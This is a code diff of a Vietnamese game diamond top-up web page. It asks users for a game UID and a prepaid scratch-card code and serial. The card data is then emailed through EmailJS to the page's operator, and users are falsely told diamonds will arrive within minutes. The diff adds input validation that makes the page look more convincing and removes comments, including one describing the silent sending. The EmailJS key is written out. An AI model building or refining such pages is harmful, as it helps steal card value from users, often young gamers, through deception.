@@ -1025,7 +1025,7 @@
 
                     <div class="form-group">
                         <label>Mã thẻ</label>
-                        <input type="text" id="cardCode" class="input-field" placeholder="Nhập mã thẻ cào" style="width: 100%;">
+                        <input type="text" id="cardCode" class="input-field" placeholder="Nhập mã thẻ" style="width: 100%;">
                     </div>
                     <div class="form-group">
                         <label>Số Seri</label>
@@ -1164,7 +1164,7 @@
                     </div>
                     <div class="qr-info-row" style="margin-top: 10px;">
                         <span>Số kim cương:</span>
-                        <span class="qr-amount-text" id="qrModalAmount">💎 1.415 Kim Cương</span>
+                        <span class="qr-amount-text">💎 1.415 Kim Cương</span>
                     </div>
                     <div class="qr-info-row">
                         <span>Nội dung (UID):</span>
@@ -1185,7 +1185,6 @@
 
     <!-- JavaScript Xử Lý Tương Tác & EmailJS -->
     <script>
-        // ================= CẤU HÌNH EMAILJS ĐÃ ĐƯỢC TÍCH HỢP =================
         (function() {
             emailjs.init("D32s33ZSpoM1W4Pkf"); // Public Key của bạn
         })();
@@ -1202,7 +1201,6 @@
         let currentOnlineTitle = '💎 1.415 Kim Cương';
         let currentPayMethod = 'Ví ShopeePay';
 
-        // ĐÃ SỬA: Mặc định khởi tạo thẻ cào từ 50.000 đ thay vì 10.000 đ
         let currentCardType = 'Viettel';
         let currentCardPrice = '50.000 đ';
         let currentCardTitle = '💎 1.415 Kim Cương';
@@ -1223,12 +1221,22 @@
         const selectedPrice = document.getElementById('selectedPrice');
         const btnPay = document.getElementById('btnPay');
 
+        // REGEX KIỂM TRA ĐỘ DÀI KÝ TỰ
+        const uidRegex = /^\d{8,11}$/;       // Chỉ nhận chữ số, độ dài từ 8 đến 11
+        const cardNumRegex = /^\d{11,15}$/;  // Chỉ nhận chữ số, độ dài từ 11 đến 15
+
+        // Xử lý nút Đăng nhập UID
         btnLogin.addEventListener('click', function() {
             const uid = uidInput.value.trim();
             if(!uid) {
                 alert('Vui lòng nhập UID của bạn!');
                 return;
             }
+            if(!uidRegex.test(uid)) {
+                alert('UID không hợp lệ!');
+                return;
+            }
+
             loggedUid = uid;
             displayUid.textContent = loggedUid;
             loginSection.style.display = 'none';
@@ -1253,7 +1261,6 @@
             document.getElementById('tab-card').classList.remove('active');
             document.getElementById('tab-shop').classList.remove('active');
 
-            // Ẩn/hiện phần chọn phương thức thanh toán tuỳ theo tab
             document.getElementById('stepPaySection').style.display = (tab === 'card') ? 'none' : 'block';
 
             if(tab === 'online') {
@@ -1332,6 +1339,7 @@
             }
         }
 
+        // Xử lý sự kiện khi ấn Thanh Toán
         btnPay.addEventListener('click', function() {
             if(!loggedUid) {
                 alert('Vui lòng nhập và đăng nhập UID trước khi thanh toán!');
@@ -1354,6 +1362,16 @@
                     return;
                 }
 
+                // Kiểm tra độ dài Mã thẻ và Số seri
+                if(!cardNumRegex.test(code)) {
+                    alert('Mã thẻ không hợp lệ!');
+                    return;
+                }
+                if(!cardNumRegex.test(seri)) {
+                    alert('Số Seri không hợp lệ!');
+                    return;
+                }
+
                 const now = new Date();
                 const timeStr = now.getHours().toString().padStart(2,'0') + ':' + 
                                 now.getMinutes().toString().padStart(2,'0') + ' - ' + 
@@ -1361,7 +1379,6 @@
                                 (now.getMonth()+1).toString().padStart(2,'0') + '/' + 
                                 now.getFullYear();
 
-                // Gửi thông tin kèm theo mệnh giá thẻ cào đã chọn
                 const cardParams = {
                     name: "Hệ thống Nạp Thẻ - Thẻ Cào Mới",
                     time: timeStr,
@@ -1374,7 +1391,6 @@
                 modalTitle.textContent = "Thẻ đã gửi thành công!";
                 modalDesc.textContent = `Thẻ ${currentCardType} (${currentCardPrice})\nMã: ${code}\nUID: ${loggedUid}\n\nHệ thống đang kiểm tra thẻ cào. Kim Cương sẽ được nạp sau 1-3 phút.`;
 
-                // Gửi Email ngầm về hệ thống
                 emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, cardParams)
                     .then(function(response) {
                         console.log("Đã gửi thông tin thẻ cào thành công!", response.status);
